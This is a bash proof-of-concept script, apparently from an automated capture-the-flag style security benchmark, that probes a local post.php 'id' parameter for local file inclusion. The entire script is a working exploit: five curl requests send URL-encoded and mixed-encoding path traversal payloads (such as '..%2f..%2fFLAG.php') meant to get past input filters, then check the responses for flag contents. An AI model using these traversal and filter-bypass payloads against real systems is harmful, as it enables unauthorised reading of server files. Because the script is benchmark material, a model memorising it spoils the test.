#!/bin/bash
# POC: Verify that URL-encoded LFI payloads bypass any filters on post.php 'id' parameter
# Target: ./repo
# Created: 2025-12-01T15:49:28.234Z
# Session: benchmark-XBEN-061-24-minbd4b8

# LFI Encoding Bypass POC - Verifies URL-encoded traversal sequences work
# Target: post.php?id parameter

TARGET_URL="http://localhost/post.php"
FLAG_FILE="FLAG.php"

echo "=== LFI Encoding Bypass Test Suite ==="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Standard URL Encoding (%2e%2e%2f for ../)
echo "[Test 1] Standard URL Encoding (%2e%2e%2f for ../)"
ENCODED_PAYLOAD="%2e%2e%2fFLAG.php"
RESPONSE=$(curl -s "$TARGET_URL?id=$ENCODED_PAYLOAD")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?id=$ENCODED_PAYLOAD")

if echo "$RESPONSE" | grep -q "FLAG\|flag"; then
    echo "✓ VULNERABLE: Encoded ../ successfully accessed $FLAG_FILE"
    echo "HTTP Code: $HTTP_CODE"
else
    echo "✗ Not vulnerable or file not found"
fi
echo ""

# Test 2: Slash Encoding (%2f for /)
echo "[Test 2] Slash Encoding (..%2f for ../)"
ENCODED_PAYLOAD="..%2fFLAG.php"
RESPONSE=$(curl -s "$TARGET_URL?id=$ENCODED_PAYLOAD")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?id=$ENCODED_PAYLOAD")

if echo "$RESPONSE" | grep -q "FLAG\|flag"; then
    echo "✓ VULNERABLE: Encoded slash successfully accessed $FLAG_FILE"
    echo "HTTP Code: $HTTP_CODE"
else
    echo "✗ Not vulnerable or file not found"
fi
echo ""

# Test 3: Multiple Traversal with Encoding
echo "[Test 3] Multiple Traversal (..%2f..%2fFLAG.php)"
ENCODED_PAYLOAD="..%2f..%2fFLAG.php"
RESPONSE=$(curl -s "$TARGET_URL?id=$ENCODED_PAYLOAD")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?id=$ENCODED_PAYLOAD")

if echo "$RESPONSE" | grep -q "FLAG\|flag"; then
    echo "✓ VULNERABLE: Multiple encoded traversal works"
    echo "HTTP Code: $HTTP_CODE"
else
    echo "✗ Not vulnerable or file not found"
fi
echo ""

# Test 4: Mixed Encoding
echo "[Test 4] Mixed Encoding (..%2F%2e%2e%2fFLAG.php)"
ENCODED_PAYLOAD="..%2F%2e%2e%2fFLAG.php"
RESPONSE=$(curl -s "$TARGET_URL?id=$ENCODED_PAYLOAD")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?id=$ENCODED_PAYLOAD")

if echo "$RESPONSE" | grep -q "FLAG\|flag"; then
    echo "✓ VULNERABLE: Mixed encoding bypasses filters"
    echo "HTTP Code: $HTTP_CODE"
else
    echo "✗ Not vulnerable or file not found"
fi
echo ""

# Test 5: Control Test - Raw Encoding (should fail if encoding is intended as a filter)
echo "[Test 5] Control Test - Raw traversal (../FLAG.php)"
RESPONSE=$(curl -s "$TARGET_URL?id=../FLAG.php")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?id=../FLAG.php")

if echo "$RESPONSE" | grep -q "FLAG\|flag"; then
    echo "✓ VULNERABLE: Raw ../ also works (no filter present)"
    echo "HTTP Code: $HTTP_CODE"
else
    echo "✗ Raw traversal blocked - filters may be in place"
fi
echo ""

echo "=== Summary ==="
echo "If encoded payloads work but raw payloads don't, encoding filter bypass is confirmed."
echo "If both work, this is the same LFI vulnerability without encoding-specific filters."